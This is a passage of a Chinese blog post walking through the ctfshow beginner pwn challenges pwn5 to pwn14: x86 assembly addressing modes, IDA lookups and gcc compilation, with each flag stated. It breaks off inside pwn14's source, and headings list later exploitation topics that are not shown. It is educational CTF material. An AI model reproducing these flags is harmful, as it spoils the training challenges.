
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>ctfshow pwn入门 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Test-your-nc"><span class="toc-number">2.</span> <span class="toc-text">Test_your_nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80"><span class="toc-number">3.1.</span> <span class="toc-text">汇编语言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn5"><span class="toc-number">3.1.1.</span> <span class="toc-text">pwn5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn6"><span class="toc-number">3.1.2.</span> <span class="toc-text">pwn6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn7"><span class="toc-number">3.1.3.</span> <span class="toc-text">pwn7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn8"><span class="toc-number">3.1.4.</span> <span class="toc-text">pwn8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn9"><span class="toc-number">3.1.5.</span> <span class="toc-text">pwn9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn10"><span class="toc-number">3.1.6.</span> <span class="toc-text">pwn10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn11"><span class="toc-number">3.1.7.</span> <span class="toc-text">pwn11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn12"><span class="toc-number">3.1.8.</span> <span class="toc-text">pwn12</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">3.2.</span> <span class="toc-text">编译</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn13"><span class="toc-number">3.2.1.</span> <span class="toc-text">pwn13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn14"><span class="toc-number">3.2.2.</span> <span class="toc-text">pwn14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn15"><span class="toc-number">3.2.3.</span> <span class="toc-text">pwn15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn16"><span class="toc-number">3.2.4.</span> <span class="toc-text">pwn16</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">3.3.</span> <span class="toc-text">nc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn17"><span class="toc-number">3.3.1.</span> <span class="toc-text">pwn17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system-%E2%80%9C-x2F-bin-x2F-sh%E2%80%9D"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn18"><span class="toc-number">3.3.2.</span> <span class="toc-text">pwn18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#echo-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">echo+输出重定向符号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn19"><span class="toc-number">3.3.3.</span> <span class="toc-text">pwn19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gt-amp-0"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">&gt;&amp;0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#plt%E4%B8%8Egot"><span class="toc-number">3.4.</span> <span class="toc-text">plt与got</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn20"><span class="toc-number">3.4.1.</span> <span class="toc-text">pwn20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#got%E8%A1%A8%E4%B8%8E-got-plt%E6%98%AF%E5%90%A6%E5%8F%AF%E5%86%99"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">.got表与.got.plt是否可写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RELRO"><span class="toc-number">3.4.1.1.1.</span> <span class="toc-text">RELRO</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn21"><span class="toc-number">3.4.2.</span> <span class="toc-text">pwn21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn22"><span class="toc-number">3.4.3.</span> <span class="toc-text">pwn22</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode%E3%80%81ret2libc"><span class="toc-number">3.5.</span> <span class="toc-text">ret2shellcode、ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn23"><span class="toc-number">3.5.1.</span> <span class="toc-text">pwn23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn24"><span class="toc-number">3.5.2.</span> <span class="toc-text">pwn24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NX"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">NX</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn25"><span class="toc-number">3.5.3.</span> <span class="toc-text">pwn25</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ALSR"><span class="toc-number">3.6.</span> <span class="toc-text">ALSR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn26"><span class="toc-number">3.6.1.</span> <span class="toc-text">pwn26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn27"><span class="toc-number">3.6.2.</span> <span class="toc-text">pwn27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn28"><span class="toc-number">3.6.3.</span> <span class="toc-text">pwn28</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE"><span class="toc-number">3.7.</span> <span class="toc-text">PIE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn29"><span class="toc-number">3.7.1.</span> <span class="toc-text">pwn29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn30"><span class="toc-number">3.7.2.</span> <span class="toc-text">pwn30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn31"><span class="toc-number">3.7.3.</span> <span class="toc-text">pwn31</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%BA%A2%E5%87%BA%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">3.7.3.1.</span> <span class="toc-text">计算溢出偏移量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.7.3.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORTIFY-SOURCE"><span class="toc-number">3.8.</span> <span class="toc-text">FORTIFY_SOURCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn32"><span class="toc-number">3.8.1.</span> <span class="toc-text">pwn32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn33"><span class="toc-number">3.8.2.</span> <span class="toc-text">pwn33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn34"><span class="toc-number">3.8.3.</span> <span class="toc-text">pwn34</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">4.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn35"><span class="toc-number">4.1.</span> <span class="toc-text">pwn35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36"><span class="toc-number">4.2.</span> <span class="toc-text">pwn36</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ctfshow pwn入门</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/6/20
        </span>
        
        <span class="category">
            <a href="/blog/categories/Pwn/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Pwn
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ctfshow/" style="color: #ff7d73">ctfshow</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">11.7k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">50分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为ctfshow新开了个pwn入门的靶场，限免15天共36题，不学白不学（</p>
<p>参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170?type=blog">T1ngSh0w的博客</a></p>
<span id="more"></span>

<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><p>简单的nc操作，只需会一点linux命令和代码审计能力就能ak的部分</p>
<hr>
<h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p>pwn5~pwn12附件相同</p>
<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>pwn题的起手式一般是在拿到附件之后先丢到虚拟机中</p>
<p>给可执行文件加上执行权限</p>
<p><code>checksec</code>检查保护状态和文件的位数</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621005020007.png" alt="image-20230621005020007"></p>
<p>可以发现是32位的，那就丢到ida中进行反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>

  v0 <span class="token operator">=</span> <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_80490E8<span class="token punctuation">,</span> <span class="token number">0x16u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题还给了asm汇编源代码，直接打开或cat读取其内容</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data
    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0	; 声明了一个名为msg的字符串，包含了18个字符和一个空字符。最后的0是一个字节的空字符，用于表示字符串的结束

section .text
    global _start	; 定义了程序的入口点_start

_start:

; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1

; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx

; 直接寻址方式
    mov ecx, [msg]      ; 将msg的地址赋值给ecx

; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax

; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax

; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax

; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax

; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用

; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0
    int 0x80            ; 调用系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题要求运行此文件，将得到的字符串提交</p>
<p>那我们直接运行即可</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621005648539.png" alt="image-20230621005648539"></p>
<p>flag就是<code>ctfshow&#123;Welcome_to_CTFshow_PWN&#125;</code></p>
<hr>
<h3 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h3><blockquote>
<p>立即寻址方式结束后eax寄存器的值为？</p>
</blockquote>
<p>那我们直接看立即寻址部分即可</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>旁边的注释写的很清晰了</p>
<p>这里就是一个基础的运算eax&#x3D;11+114504-1&#x3D;114514</p>
<p>即flag为<code>ctfshow&#123;114514&#125;</code></p>
<hr>
<h3 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h3><blockquote>
<p>寄存器寻址方式结束后edx寄存器的值为？</p>
</blockquote>
<p>看寄存器寻址方式部分</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如注释所说的，edx&#x3D;ebx&#x3D;0x36d</p>
<p>flag:<code>ctfshow&#123;0x36D&#125;</code>(这里的flag要大写D)</p>
<hr>
<h3 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h3><blockquote>
<p>直接寻址方式结束后ecx寄存器的值为？</p>
</blockquote>
<p>看直接寻址部分</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 直接寻址方式
    mov ecx, [msg]      ; 将msg的地址赋值给ecx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如注释，ecx&#x3D;[msg]</p>
<p>要获取这里的msg地址需将可执行文件用ida进行反编译</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621214459412.png" alt="image-20230621214459412"></p>
<p>找到ecx寄存器，旁边这个<code>dword_80490E8</code>就是[msg]，点击<code>dword_80490E8</code>跟进</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621214644454.png" alt="image-20230621214644454"></p>
<p>.data后面的<code>080490E8</code>就是msg的地址</p>
<p>所以flag：<code>ctfshow&#123;0x80490E8&#125;</code>(这里是16进制数据，0后面要补上x)</p>
<hr>
<h3 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h3><blockquote>
<p>寄存器间接寻址方式结束后eax寄存器的值为？</p>
</blockquote>
<p>看间接寻址部分</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如注释，eax&#x3D;[esi]&#x3D;msg</p>
<p>此时esi寄存器的值为msg，即上题中的<code>080490E8</code></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621220453896.png" alt="image-20230621220453896"></p>
<p><code>mov eax,[esi]</code>将esi中的值作为地址，然后将该地址单元的值赋给eax</p>
<p>即把080490E8地址单元中的值<code>636C6557h</code>赋给eax</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230621221113156.png" alt="image-20230621221113156"></p>
<p>所以eax&#x3D;636C6557h，末尾的h表示十六进制</p>
<p>则flag：<code>ctfshow&#123;0x636C6557&#125;</code></p>
<hr>
<h3 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h3><blockquote>
<p>寄存器相对寻址方式结束后eax寄存器的值为？</p>
</blockquote>
<p>看相对寻址部分</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如注释，ecx&#x3D;ecx+4&#x3D;msg，eax&#x3D;[ecx]</p>
<p>第一个mov中ecx的值为msg的地址<code>080490E8</code></p>
<p>然后将这个值加4，十六进制计算器敲一下得到结果是<code>080490EC</code></p>
<p>第二个mov是把这个值作为地址，将地址单元的值赋给eax</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622102933869.png" alt="image-20230622102933869"></p>
<p>可以看到<code>080490EC</code>地址单元中的值为<code>ome_to_CTFshow_PWN</code>，即eax寄存器的值为<code>ome_to_CTFshow_PWN</code></p>
<p>flag：<code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
<hr>
<h3 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h3><blockquote>
<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
</blockquote>
<p>看基址变址寻址方式</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如注释，ecx&#x3D;msg&#x3D;<code>080490E8</code>，edx&#x3D;2，eax&#x3D;[ecx+edx*2]</p>
<p>edx*2&#x3D;4，那eax的值就等于[ecx+4]的地址单元，那就和上题一样是<code>ome_to_CTFshow_PWN</code></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622102933869.png" alt="image-20230622102933869"></p>
<p>flag：<code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
<hr>
<h3 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h3><blockquote>
<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
</blockquote>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如注释，ecx&#x3D;msg&#x3D;<code>080490E8</code>，edx&#x3D;1，ecx&#x3D;ecx+8，eax&#x3D;[ecx + edx*2 - 6]</p>
<p>算一算就知道结果还是eax&#x3D;[ecx+4]</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622102933869.png" alt="image-20230622102933869"></p>
<p>flag：<code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
<hr>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h3 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h3><blockquote>
<p>gcc编译使用</p>
</blockquote>
<p>下载题目附件flag.c，拖入虚拟机中进行gcc编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> flag flag.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后运行得到flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622105912981.png" alt="image-20230622105912981"></p>
<p>flag：<code>ctfshow&#123;hOw_t0_us3_GCC?&#125;</code></p>
<hr>
<h3 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h3><blockquote>
<p>创建key文件</p>
</blockquote>
<p>下载题目附件flag.c，阅读源码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

